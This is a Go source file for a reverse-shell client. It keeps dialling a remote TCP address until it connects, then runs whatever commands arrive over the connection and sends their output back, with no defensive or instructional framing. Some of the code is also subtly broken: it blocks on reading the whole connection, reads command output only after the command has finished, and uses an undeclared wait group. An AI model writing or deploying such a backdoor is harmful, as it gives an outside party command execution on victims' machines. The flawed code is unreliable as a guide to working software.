package shell

import (
	"io/ioutil"
	"net"
	"os/exec"
	"strings"
	"time"
)

type Client struct {
	Conn net.Conn
}

// NewClient - This is used to initialize a new
// instance of a shell client. It should be called
// first, before doing anything involving the client.
func NewClient(hostAddr string) *Client {
	wg.Add(1)
	defer wg.Done()

	sc := new(Client)

	for {
		var err error
		sc.Conn, err = net.Dial("tcp", hostAddr)
		if err == nil {
			break
		}

		// sleep for 10 ms to allow access to resources locked by waitgroup
		time.Sleep(10 * time.Millisecond)
	}

	return sc
}

// SpawnShell - (CLIENT) This should be used to create a synchronous
// (blocking) function on the client-side that constantly tries to connect
// to the server. Once it does connect to the server, it listens
// for commands.
func (sc *Client) SpawnShell(hostAddr string) error {
	wg.Add(1)
	defer wg.Done()

	for {
		cmdToRun, err := ioutil.ReadAll(sc.Conn)
		if err != nil {
			return err
		}
		cmdToRunStrs := strings.Split(string(cmdToRun[:]), " ")
		cmd := exec.Command(cmdToRunStrs[0], cmdToRunStrs[1:]...)

		stdoutPipe, err := cmd.StdoutPipe()
		if err != nil {
			return err
		}

		err = cmd.Run()
		if err != nil {
			return err
		}
		buff, err := ioutil.ReadAll(stdoutPipe)
		if err != nil {
			return err
		}
		sc.Conn.Write(buff)

		// sleep for 10 ms to allow accesses to resources locked by waitgroup
		time.Sleep(10 * time.Millisecond)
	}
	return nil
}
